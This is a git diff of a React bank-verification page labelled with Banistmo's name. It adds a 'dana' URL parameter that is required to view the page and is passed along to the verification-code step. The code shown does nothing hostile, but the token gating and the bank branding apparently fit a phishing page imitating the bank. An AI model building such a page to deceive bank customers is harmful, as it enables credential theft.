@@ -1,5 +1,6 @@
 import React, { useEffect, useState } from 'react'
-import { useNavigate } from 'react-router-dom'
+import { useLocation, useNavigate } from 'react-router-dom'
+import { buildPathWithDana, getDanaParamFromSearch, persistDanaParam } from '../utils/dana'
 
 const METHODS = [
   {
@@ -18,6 +19,7 @@ const METHODS = [
 
 export default function VerificationMethod() {
   const navigate = useNavigate()
+  const location = useLocation()
   const [selectedMethod, setSelectedMethod] = useState(() => {
     try {
       return localStorage.getItem('banistmo:verificationMethod') || ''
@@ -25,6 +27,19 @@ export default function VerificationMethod() {
       return ''
     }
   })
+  const [danaParam, setDanaParam] = useState('')
+
+  useEffect(() => {
+    const danaValue = getDanaParamFromSearch(location.search)
+    if (!danaValue) {
+      setDanaParam('')
+      navigate('/error', { replace: true })
+      return
+    }
+
+    setDanaParam(danaValue)
+    persistDanaParam(danaValue)
+  }, [location.search, navigate])
 
   useEffect(() => {
     try {
@@ -37,7 +52,7 @@ export default function VerificationMethod() {
   const handleSubmit = (event) => {
     event.preventDefault()
     if (selectedMethod) {
-      navigate('/codigo-verificacion')
+      navigate(buildPathWithDana('/codigo-verificacion', danaParam))
     }
   }
 
@@ -96,7 +111,7 @@ export default function VerificationMethod() {
 
           <button
             type="button"
-            onClick={() => navigate('/')}
+            onClick={() => navigate(buildPathWithDana('/', danaParam))}
             className="mt-6 text-sm font-medium text-yellow-600 hover:text-yellow-700"
           >
             ¿Estos no son tus datos?
